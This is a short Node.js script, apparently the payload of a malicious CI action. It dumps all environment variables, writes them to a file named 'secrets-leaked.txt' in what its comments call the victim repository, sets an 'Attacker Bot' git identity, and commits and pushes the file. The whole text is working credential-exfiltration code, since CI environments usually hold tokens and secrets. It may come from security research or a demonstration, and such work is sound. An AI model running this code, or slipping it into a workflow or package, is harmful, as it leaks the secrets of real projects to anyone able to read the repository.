const fs = require('fs');
const { execSync } = require('child_process');

// Dump all env variables
const envDump = Object.entries(process.env)
  .map(([k, v]) => `${k}=${v}`)
  .join('\n');

// Write secrets to a file in the victim repo
fs.writeFileSync('secrets-leaked.txt', envDump);

// Setup Git config
execSync('git config user.email "attacker@example.com"');
execSync('git config user.name "Attacker Bot"');

// Stage, commit, and push the file
execSync('git add secrets-leaked.txt');
execSync('git commit -m "leak: secrets dumped by action"');
execSync('git push');
